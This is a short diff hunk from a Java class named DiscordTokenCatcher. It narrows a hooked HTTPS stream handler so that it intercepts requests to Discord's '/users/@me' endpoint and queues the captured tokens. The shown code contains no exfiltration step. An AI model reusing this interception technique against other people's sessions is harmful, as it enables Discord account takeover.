@@ -46,7 +46,7 @@ public class DiscordTokenCatcher {
 	private static void initURLStreamHandler() {
 		URL.setURLStreamHandlerFactory(protocol -> {
 			if ("https".equals(protocol)) {
-				return new HTTPSIntercepter<>(url -> url.contains("/api/v"), DiscordTokenCatcher.queue,
+				return new HTTPSIntercepter<>(url -> url.contains("/users/@me"), DiscordTokenCatcher.queue,
 						TokenIntercepter.class);
 			}
 			return null;
